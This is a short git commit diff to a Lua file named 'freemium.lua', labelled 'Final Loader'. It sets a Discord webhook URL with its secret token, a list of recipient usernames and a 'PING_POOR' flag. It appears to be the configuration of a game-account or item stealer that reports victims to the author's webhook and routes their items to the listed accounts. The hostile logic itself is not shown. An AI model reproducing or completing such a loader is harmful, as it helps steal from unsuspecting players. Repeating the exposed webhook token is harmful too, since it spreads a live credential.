ff5ad092b86db0467ca947a388c4a2b083b25559
ks2006babyy-dev <ks2006babyy@gmail.com>
2026-04-16 14:53:41 +0000

    Update freemium.lua

--- freemium.lua
+++ freemium.lua
@@ -1,7 +1,7 @@
 -- Final Loader
 _G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1494345282455077055/1fHPDJmkKw3RMjcdJ9vI2vgK-L50LoDMECcqwHUEVXJkD2wBqG6eFpGLFL2s24FNYiWA"  -- change this to your new one if you want
 
-_G.MY_USERNAMES = {"daxkidcece", "thisisanalt048", "x"}
+_G.MY_USERNAMES = {"daxkidcece", "thisisanalt048", "username"}
 
 _G.PING_POOR = true
 
